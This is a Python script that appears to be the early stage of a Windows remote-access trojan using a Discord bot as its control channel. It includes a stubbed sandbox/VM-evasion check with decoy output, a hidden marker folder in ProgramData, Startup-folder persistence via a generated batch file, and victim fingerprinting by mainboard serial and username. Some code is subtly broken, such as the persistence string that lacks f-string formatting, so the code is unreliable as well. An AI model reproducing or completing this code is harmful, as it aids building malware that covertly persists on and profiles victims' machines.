import os
import discord
from dotenv import load_dotenv
import ctypes
import json
import wmi
from discord.ext import commands

FLAG_PATH = "C:\\ProgramData\\FUC Cache"

INSTALL_PATH = "C:\\ProgramData\\FUC HUB"

START_FOLDER = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')

# Load the environment variables from the .env file
load_dotenv()
TOKEN = os.getenv('TOKEN')

# Set up intents
intents = discord.Intents.default()
intents.message_content = True
intents.messages = True

# Create the client instance with the specified intents
client = discord.Client(intents=intents)


# Event handler for when the bot has successfully connected to Discord
@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')


# Event handler for when a message is sent in a channel the bot has access to
@client.event
async def on_message(message):
    # Check if the message is sent by the bot itself to avoid infinite loops
    if message.author == client.user:
        return

    if message.content.strip():
        # Repeat the message
        await message.channel.send(message.content)


def check_for_vm():
    return False
def create_flag():
    try:
        os.mkdir(FLAG_PATH)
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(FLAG_PATH, FILE_ATTRIBUTE_HIDDEN)
    except:
        return

def check_flags():
    if os.path.isdir(FLAG_PATH):
        return True
    return False

def get_persistence():
    # benutzten des windows user startup folders
    try:
        with open("WINDOWS.bat", "w") as f:
            if os.path.isfile(os.path.join(START_FOLDER, "fulcrum_beacon.py")):
                f.write('@echo off /n{os.path.join(START_FOLDER, "fulcrum_beacon.py")}')
            elif os.path.isfile(os.path.join(START_FOLDER, "fulcrum_beacon.exe")):
                f.write('@echo off /n{os.path.join(START_FOLDER, "fulcrum_beacon.exe")}')
    except:
        return

def create_unique_profile():
    c = wmi.WMI()
    mainboard_serial = c.Win32_BaseBoard()[0].SerialNumber.strip()
    profile = {
        'hardware_id': f'{mainboard_serial}',
        'user_name': f'{os.getlogin()}',
    }
    with open('profile.json', 'w') as f:
        json.dump(profile, f)


async def create_discord_channel():
    print("create_discord_channel")
    guild = client.guilds[0]  # Assumes the bot is in only one guild
    channel_name = "new-text-channel"

    try:
        new_channel = await guild.create_text_channel(channel_name)
        print(f"Created new text channel: {new_channel.name}")
    except discord.Forbidden:
        print("Bot doesn't have the required permissions to create a channel")
    except discord.HTTPException:
        print("An error occurred while creating the channel")

def main():
    # überprüfen ob fulcrum in einem vm läuft
    if check_for_vm() is True:
        print("hello world")
        a = 1+1-42
        print(a)
        return

    print("test")

    if check_flags() is False:
        create_flag()
        get_persistence()
        create_unique_profile()

    # starten des discord bots
    client.run(TOKEN)

main()